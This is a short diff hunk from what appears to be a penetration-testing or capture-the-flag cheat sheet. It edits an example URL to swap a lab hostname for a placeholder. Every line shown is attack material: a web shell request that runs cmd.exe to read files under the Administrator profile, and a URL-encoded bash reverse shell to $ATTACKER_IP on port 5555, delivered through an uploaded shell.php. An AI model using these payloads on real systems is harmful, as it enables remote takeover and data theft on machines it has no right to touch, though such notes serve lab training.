@@ -15,5 +15,5 @@ http://$VICTIM_IP/rev.php?cmd=cmd.exe%20/c%20more%20..\..\Users\Administrator\De
 bash -c 'bash -i >%26 /dev/tcp/$ATTACKER_IP/5555 0>%261'
 
 #example URL 
-<http://admin.usage.htb/uploads/images/shell.php?c=bash > -c 'bash -i >%26 /dev/tcp/$ATTACKER_IP/5555 0>%261'
+<http://admin.$DOMAIN/uploads/images/shell.php?c=bash > -c 'bash -i >%26 /dev/tcp/$ATTACKER_IP/5555 0>%261'
 ```
